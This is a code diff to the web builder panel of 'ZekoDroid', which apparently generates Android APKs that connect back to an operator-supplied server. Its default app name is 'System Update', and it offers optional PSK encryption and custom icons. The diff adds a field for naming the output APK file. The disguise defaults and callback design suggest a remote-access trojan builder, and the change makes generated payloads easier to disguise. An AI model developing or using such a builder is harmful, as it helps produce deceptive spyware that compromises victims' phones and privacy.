@@ -116,6 +116,7 @@
       <b>tên app</b><input id="bName" value="System Update" placeholder="System Update" />
       <b>home page</b><input id="bHome" placeholder="https://google.com (để trống = mở màn hình cài đặt)" />
       <b>psk</b><input id="bPsk" placeholder="(để trống nếu không mã hoá)" />
+      <b>tên file apk</b><input id="bFile" placeholder="để trống = ZekoDroid-<ip>.apk" />
       <b>icon</b><input id="bIcon" type="file" accept="image/png" />
     </div>
     <div class="sp"></div>
@@ -605,6 +606,7 @@ render = function () {
     const name = document.querySelector('#bName').value.trim();
     const home = document.querySelector('#bHome').value.trim();
     const psk = document.querySelector('#bPsk').value.trim();
+    const fileName = document.querySelector('#bFile').value.trim();
     const out = document.querySelector('#bOut');
     if (!srvUrl) { out.textContent = 'nhập server url đã (vd http://1.2.3.4:7878)'; return; }
     const hostForName = (srvUrl.match(/\/\/([^:/]+)/) || [, srvUrl])[1];
@@ -625,7 +627,7 @@ render = function () {
       const r = await fetch('/api/builder/build', {
         method: 'POST', credentials: 'same-origin',
         headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ url: srvUrl, name, home, psk, icon })
+        body: JSON.stringify({ url: srvUrl, name, home, psk, icon, filename: fileName })
       });
       if (!r.ok) {
         const j = await r.json().catch(() => ({}));
@@ -636,10 +638,12 @@ render = function () {
       const url = URL.createObjectURL(blob);
       const a = document.createElement('a');
       a.href = url;
-      a.download = `ZekoDroid-${hostForName.replace(/[.:]/g, '_')}.apk`;
+      const dlName = fileName ? (fileName.toLowerCase().endsWith('.apk') ? fileName : fileName + '.apk')
+        : `ZekoDroid-${hostForName.replace(/[.:]/g, '_')}.apk`;
+      a.download = dlName;
       a.click();
       URL.revokeObjectURL(url);
-      out.textContent = `OK · ${(blob.size / 1024).toFixed(1)} KB · ${Date.now() - t0} ms` + "\n" + `url=${srvUrl}  name=${name || "(mặc định)"}  home=${home || "(không)"}  psk=${psk ? "có" : "không"}`;
+      out.textContent = `OK · ${(blob.size / 1024).toFixed(1)} KB · ${Date.now() - t0} ms` + "\n" + `file=${dlName}  name=${name || "(mặc định)"}  home=${home || "(không)"}  psk=${psk ? "có" : "không"}`;
     } catch (e) {
       out.textContent = 'lỗi: ' + e.message;
     }
